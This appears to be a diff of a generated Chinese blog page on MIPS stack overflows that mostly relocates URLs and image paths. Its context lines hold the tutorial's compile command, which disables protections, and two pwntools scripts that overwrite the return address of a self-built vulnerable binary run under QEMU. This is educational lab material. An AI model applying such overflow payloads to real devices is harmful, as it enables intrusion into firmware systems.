@@ -22,19 +22,19 @@
     <meta name="description" content="​	CPU指令集架构有多种，例如：ARM，x86，MIPS。由于其成本低等等特性，固件设备里通常会以MIPS架构为主。 ​	MIPS分为大小端序（字节数据怎么进入内存的），以及32，64位（CPU一次能处理数据大小） 12345678910111213端序：以0x12345678为例子小端序内存地址从低到高：78 56 34 12大端序内存地址由高到低：12 34 56 78位数：32位只能放4字">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MIPS栈溢出">
-<meta property="og:url" content="https://yy-t1.github.io/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:url" content="https://yy-t1.github.io/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
 <meta property="og:site_name" content="bsahfm">
 <meta property="og:description" content="​	CPU指令集架构有多种，例如：ARM，x86，MIPS。由于其成本低等等特性，固件设备里通常会以MIPS架构为主。 ​	MIPS分为大小端序（字节数据怎么进入内存的），以及32，64位（CPU一次能处理数据大小） 12345678910111213端序：以0x12345678为例子小端序内存地址从低到高：78 56 34 12大端序内存地址由高到低：12 34 56 78位数：32位只能放4字">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512144048875.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512151740351.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154238963.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154507733.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512144048875.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512151740351.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154238963.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154507733.png">
 <meta property="article:published_time" content="2026-05-12T05:51:35.000Z">
 <meta property="article:modified_time" content="2026-05-12T07:46:58.820Z">
 <meta property="article:author" content="bsahfm">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yy-t1.github.io/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512144048875.png">
+<meta name="twitter:image" content="https://yy-t1.github.io/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512144048875.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -428,23 +428,23 @@
 <p><code>mipsel-linux-gnu-gcc vul.c -o vul -static -fno-stack-protector -no-pie -Wno-implicit-function-declaration</code></p>
 <p>关闭所有保护与警告。</p>
 <p>file查看格式</p>
-<img src="/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512144048875.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512144048875">
+<img src="/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512144048875.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512144048875">
 
 
 
 <p>LSB是小端序，MSB是大端序</p>
-<img src="/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512151740351.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512151740351">
+<img src="/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512151740351.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512151740351">
 
 <p>IDA后门地址</p>
 <p>exp：</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;mips&#x27;</span>, <span class="hljs-attribute">endian</span>=<span class="hljs-string">&#x27;little&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process([<br>    <span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<br>    <span class="hljs-string">&#x27;./vul&#x27;</span><br>])<br><br><br>system_addr = p32(0x400850)<br>payload = 0x10<span class="hljs-number">*b</span><span class="hljs-string">&#x27;a&#x27;</span> + system_addr<br><br>gdb.attach(p, <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">set architecture mips</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154238963.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512154238963">
+<img src="/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154238963.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512154238963">
 
 <p>这里报错了，栈上还可能有其他数据干扰，所以最好还是手动测试一下返回地址的位置</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;mips&#x27;</span>, <span class="hljs-attribute">endian</span>=<span class="hljs-string">&#x27;little&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process([<br>    <span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<br>    <span class="hljs-string">&#x27;./vul&#x27;</span><br>])<br><br><br>system_addr = p32(0x400850)<br>payload = 20<span class="hljs-number">*b</span><span class="hljs-string">&#x27;a&#x27;</span> + system_addr<br><br>gdb.attach(p, <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">set architecture mips</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154507733.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512154507733">
+<img src="/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/image-20260512154507733.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512154507733">
 
                 
               </div>
@@ -491,7 +491,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>MIPS栈溢出</div>
-      <div>https://yy-t1.github.io/2026/05/12/MIPS栈溢出/</div>
+      <div>https://yy-t1.github.io/2026/05/12/pwn/pwn基础/MIPS栈溢出/</div>
     </div>
     <div class="license-meta">
       
@@ -535,7 +535,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/05/13/kernel%E5%85%A5%E9%97%A8/" title="kernel入门">
+                      <a href="/2026/05/13/pwn/kernel/kernel%E5%85%A5%E9%97%A8/" title="kernel入门">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">kernel入门</span>
                         <span class="visible-mobile">上一篇</span>
@@ -545,7 +545,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/" title="pwn_bug视频总结">
+                      <a href="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/" title="pwn_bug视频总结">
                         <span class="hidden-mobile">pwn_bug视频总结</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
